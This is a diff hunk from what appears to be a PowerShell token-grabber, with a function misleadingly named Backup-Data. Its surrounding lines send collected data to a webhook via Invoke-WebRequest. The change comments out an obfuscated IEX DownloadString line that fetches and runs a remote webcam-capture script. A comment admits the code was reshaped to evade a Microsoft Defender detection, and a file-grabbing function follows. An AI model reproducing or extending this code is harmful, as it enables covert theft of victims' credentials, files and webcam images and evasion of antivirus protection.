@@ -736,10 +736,11 @@ function Backup-Data {
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 
     # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
-    function Get-WebcamIMG {
-        I'E'X(New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"("https://github.com/Chainski/PowerShell-Token-Grabber/raw/main/webcam.ps1")
-    }
-    Get-WebcamIMG
+    #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.
+    #function Get-WebcamIMG {
+    #    I'E'X(New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"("https://github.com/Chainski/PowerShell-Token-Grabber/raw/main/webcam.ps1")
+    #}
+    #Get-WebcamIMG
 
     Function Invoke-GrabFiles {
         $grabber = @(
